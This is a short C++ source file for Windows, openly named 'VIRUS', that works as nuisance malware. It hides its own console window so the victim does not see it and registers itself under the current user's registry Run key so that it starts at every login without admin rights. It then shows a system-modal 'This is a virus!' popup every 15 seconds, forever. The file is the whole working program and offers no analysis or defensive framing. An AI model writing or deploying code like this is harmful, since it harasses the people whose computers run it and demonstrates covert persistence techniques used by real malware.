#include <windows.h>
#include <iostream>

constexpr LPCSTR APPLICATION_NAME = "VIRUS";

// this makes the app start itself every time the PC turns on
static void AddToStartup() {
    HKEY registryKeyHandle;
    char executablePath[MAX_PATH];

    // find out where this file is saved
    DWORD pathLength = GetModuleFileNameA(NULL, executablePath, MAX_PATH);
    if (pathLength == 0) {
        std::cerr << "cant find the path" << std::endl;
        return;
    }

    // sneak into the startup folder in the registry
    // using CURRENT_USER so we don't need admin
    LSTATUS openResult = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_WRITE,
        &registryKeyHandle
    );

    if (openResult == ERROR_SUCCESS) {
        // tell windows to run this file at login
        LSTATUS setResult = RegSetValueExA(
            registryKeyHandle,
            APPLICATION_NAME,
            0,
            REG_SZ,
            (const BYTE*)executablePath,
            (DWORD)(strlen(executablePath) + 1)
        );

        if (setResult == ERROR_SUCCESS) {
            std::cout << "done. it'll run on boot now" << std::endl;
        }
        else {
            std::cerr << "registry broke" << std::endl;
        }

        // close it up
        RegCloseKey(registryKeyHandle);
    }
    else {
        std::cerr << "cant open registry" << std::endl;
    }
}

int main() {
    // hide the window so they dont see it
    HWND consoleWindowHandle = GetConsoleWindow();
    ShowWindow(consoleWindowHandle, SW_HIDE);

    // make it stick
    AddToStartup();

    while (true) {
        // wait a bit so it's not too crazy
        Sleep(15000);

        // spam the popup and make it stay on top
        MessageBoxA(
            NULL,
            "This is a virus!\n",
            "VIRUS",
            MB_OK | MB_ICONEXCLAMATION | MB_SYSTEMMODAL
        );
    }

    return 0;
}